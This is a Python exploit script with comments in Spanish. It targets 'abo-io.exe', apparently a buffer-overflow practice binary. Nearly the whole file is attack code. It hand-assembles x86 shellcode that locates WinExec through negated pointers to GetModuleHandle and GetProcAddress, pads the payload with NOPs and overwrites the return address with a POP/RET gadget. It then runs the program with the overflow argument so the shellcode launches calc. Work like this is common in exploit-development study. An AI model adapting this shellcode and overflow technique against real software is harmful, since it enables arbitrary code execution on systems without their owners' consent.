import sys
import binascii
from subprocess import Popen, PIPE
import struct

NegGetModuleHandleA = "\xC0\xCE\xBE\xFF"  #EDI
NegGetProcAddress   = "\xB8\xCE\xBE\xFF"  #ESI
NegKernel32     = "\x64\x12\xBF\xFF"  
Neg20ToCero     = "\xFD\x12\xBF\xFF"      # buffer que contiene "system" (0040ED03  "system")
NegCalc         = "\x70\x2F\xBF\xFF"      # Aqui guardo la string de calc
StrWinExec      = "WinExec"
StrCalc         = "calc"


cad196 = "\x90" 
instrucciones  = "\xF7\xDF\xF7\xDE"               # NEG EDI / NEG ESI                        # Obtenemos GetModuleHandle y GetProcAddress
instrucciones += "\x8D\xA4\x24\xD0\xFF\xFF\xFF"   # LEA ESP,DWORD PTR SS:[ESP-30]            # Acomoda la pila al comienzo de los datos.
instrucciones += "\x58\xF7\xD8"                   # POP EAX / NEG EAX                        # Saca la negada de kernel32 (0040ED9C Kernel32.dll)
instrucciones += "\x50\xFF\x17"                   # PUSH EAX / CALL [EDI]                    # (GetModuleHandle)
instrucciones += "\x59\xF7\xD9"                   # POP ECX / NEG ECX                        # Saca la negada de buffer que contiene "system"
instrucciones += "\x5A\x5B"                       # POP EDX / POP EBX                        # Saca la string de WinExec
#instrucciones += "\x09\x11"                      # OR DWORD PTR DS:[ECX],EDX                # Junto al AND podemos copiar los bytes del registro
#instrucciones += "\x21\x11"                      # AND DWORD PTR DS:[ECX],EDX               # lo copiamos en el dump
instrucciones += "\x33\xFF"                       # XOR EDI, EDI                             # En cero para finalizar las strings
instrucciones += "\x21\x39"                       # AND DWORD PTR DS:[ECX],EDI               # Aqui pone en cero el dword del dump
instrucciones += "\x01\x11"                       # ADD [ECX],EDX                            # Copia los bytes de la string WinExec al dump
instrucciones += "\x41" * 4                       # INC ECX (4 veces)                        # avanzamos para seguir copiando los bytes restantes
instrucciones += "\x21\x39"                       # AND DWORD PTR DS:[ECX],EDI               # Pone en cero el dword
instrucciones += "\x01\x19"                       # AND DWORD PTR DS:[ECX],EBX               # y copia los bytes restantes de la string WinExec
instrucciones += "\x41" * 3                       # INC ECX (3 veces)                        # Avanza 3 bytes para Poner el cero de fin de string
instrucciones += "\x21\x39"                       # AND DWORD PTR DS:[ECX],EDI               # mete el fin de string a WinExec.
instrucciones += "\x49" * 7                       # DEC ECX (7 veces)                        # VOLVEMOS AL INICIO DE LA STRING WINEXEC
#instrucciones += "\x09\x19"                      # OR DWORD PTR DS:[ECX],EBX                # junto al AND podemos copiar los bytes del registro
#instrucciones += "\x21\x19"                      # AND DWORD PTR DS:[ECX],EBX               # a [ecx]
#instrucciones += "\x41" * 3                      # INC ECX (3 veces) 
#instrucciones += "\x33\xD2"                      # XOR EDX, EDX
#instrucciones += "\x21\x11"                      # AND DWORD PTR DS:[ECX],EDX
instrucciones += "\x51\x50\xFF\x16"               # PUSH EAX / PUSH ECX / CALLL [ESI]        # GetProcAddress ("WinExec")
instrucciones += "\x44" * 2                       # INC ESP                                  # quedamos parados en la string calc
instrucciones += "\x21\x7C\x24\x04"               # AND DWORD PTR SS:[ESP+4],EDI             # Ponemos un cero al final de "calc" en la pila
instrucciones += "\x47"                           # INC EDI                                  # Seteamos a uno (1) al segundo parametro de WinExec
instrucciones += "\x8D\x0C\x24"                   # LEA ECX,DWORD PTR SS:[ESP]               # Mueve Ptro String "Calc" a ECX
instrucciones += "\x6A\x01"                       # PUSH 1                                   # arg2 = 1
instrucciones += "\x51"                           # PUSH ECX                                 # arg1 = ptro a "calc"
instrucciones += "\xFF\xD0"                       # CALL EAX                                 # WinExec 


cad196 += instrucciones + ("\x90" * (195 - len(instrucciones)))

EIP = "\x46\x33\x40"                              # POP/RET                                  # saltamos a la shellcode para ejecutar la calculadora

badchar = "x09 / x20 / x98 /x80 /x86/ x88 / x89 /x83"

shellcode2 = NegKernel32 + Neg20ToCero  + StrWinExec + "\x90" * 3 + StrCalc + "\x90" * 2  + NegGetModuleHandleA + NegGetProcAddress + "\x90" * 4
shellcode2 += EIP                                 # saltamos a POP/RET  

argv1 = "-63" 
argv2 = cad196  + shellcode2

#argv2 = "\x61" * 255

print(len(argv2))  

p1 = Popen("abo-io.exe " + argv1 + " " + argv2, stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")
input()

# bytes del EP eran EB10